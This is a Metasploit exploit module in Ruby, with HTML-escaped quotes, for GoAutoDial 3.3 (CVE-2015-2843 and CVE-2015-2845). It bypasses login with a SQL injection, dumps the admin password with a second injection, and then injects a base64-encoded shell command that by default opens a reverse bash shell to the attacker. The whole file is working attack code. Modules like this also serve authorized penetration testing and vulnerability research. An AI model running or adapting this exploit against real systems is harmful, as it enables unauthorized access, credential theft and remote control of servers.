# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "GoAutoDial 3.3 Authentication Bypass / Command Injection",
      &#039;Description&#039;    => %q{
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Chris McCurley&#039;,  # Discovery & Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2015-2843&#039;],
          [&#039;CVE&#039;, &#039;2015-2845&#039;]
        ],
      &#039;Platform&#039;       => %w{unix},
      &#039;Arch&#039;            => ARCH_CMD,
      &#039;Targets&#039;        => [ [&#039;Automatic&#039;, {} ] ],
      &#039;DefaultOptions&#039; => { &#039;PAYLOAD&#039; => &#039;cmd/unix/reverse_bash&#039; },
      &#039;DefaultTarget&#039;  => 0,
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Apr 21 2015&#039;))

    register_options(
      [
        OptPort.new(&#039;RPORT&#039;, [true, &#039;The target port&#039;, 443]),
        OptBool.new(&#039;SSL&#039;, [false, &#039;Use SSL&#039;, true]),
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path&#039;, &#039;/&#039;])
      ])
  end


  def check
    res = check_version()
    if res and res.body =~ /1421902800/
      return Exploit::CheckCode::Safe
    else
      return Exploit::CheckCode::Vulnerable
    end
  end

  def check_version()
    uri = target_uri.path

    send_request_cgi({
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => normalize_uri(uri, &#039;changelog.txt&#039;),
      &#039;headers&#039;   => {
        &#039;User-Agent&#039; => &#039;Mozilla/5.0&#039;,
        &#039;Accept-Encoding&#039; => &#039;identity&#039;
      }
    })
  end

  def sqli_auth_bypass()
    uri = target_uri.path

    send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(uri, &#039;index.php&#039;, &#039;go_login&#039;, &#039;validate_credentials&#039;),
      &#039;headers&#039;   => {
        &#039;User-Agent&#039; => &#039;Mozilla/5.0&#039;,
        &#039;Accept-Encoding&#039; => &#039;identity&#039;
      },
      &#039;vars_post&#039; => {
        &#039;user_name&#039;   => &#039;admin&#039;,
        &#039;user_pass&#039;   => &#039;\&#039;%20or%20\&#039;1\&#039;%3D\&#039;1&#039;
      }
    })
  end

  def sqli_admin_pass(cookies)
   uri = target_uri.path

   send_request_cgi({
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => normalize_uri(uri, &#039;index.php&#039;, &#039;go_site&#039;, &#039;go_get_user_info&#039;, &#039;\&#039;%20OR%20active=\&#039;Y&#039;),
      &#039;headers&#039;   => {
        &#039;User-Agent&#039; => &#039;Mozilla/5.0&#039;,
        &#039;Accept-Encoding&#039; => &#039;identity&#039;,
        &#039;Cookie&#039; => cookies
      }
    })
  end

  #
  # Run the actual exploit
  #
  def execute_command()

    encoded = Rex::Text.encode_base64("#{payload.encoded}")
    params = "||%20bash%20-c%20\"eval%20`echo%20-n%20" + encoded + "%20|%20base64%20--decode`\""
    uri = target_uri.path

    send_request_cgi({
      &#039;method&#039;    => &#039;GET&#039;,
      &#039;uri&#039;       => normalize_uri(uri, &#039;index.php&#039;, &#039;go_site&#039;, &#039;cpanel&#039;, params),
      &#039;headers&#039;   => {
        &#039;User-Agent&#039; => &#039;Mozilla/5.0&#039;,
        &#039;Accept-Encoding&#039; => &#039;identity&#039;,
        &#039;Cookie&#039; => @cookie
      }
    })
  end


  def exploit()
    print_status("#{rhost}:#{rport} - Trying SQL injection...")
    res1 = sqli_auth_bypass()

    if res1 && res1.code == 200
      print_good(&#039;Authentication Bypass (SQLi) was successful&#039;)
    else
      print_error(&#039;Error: Run \&#039;check\&#039; command to identify whether the auth bypass has been fixed&#039;)
    end

    @cookie = res1.get_cookies
    print_status("#{rhost}:#{rport} - Dumping admin password...")
    res = sqli_admin_pass(@cookie)

    if res
      print_good(res.body)
    else
      print_error(&#039;Error: No creds returned, possible mitigations are in place.&#039;)
    end
    print_status("#{rhost}:#{rport} - Sending payload...waiting for connection")

    execute_command()
  end
end

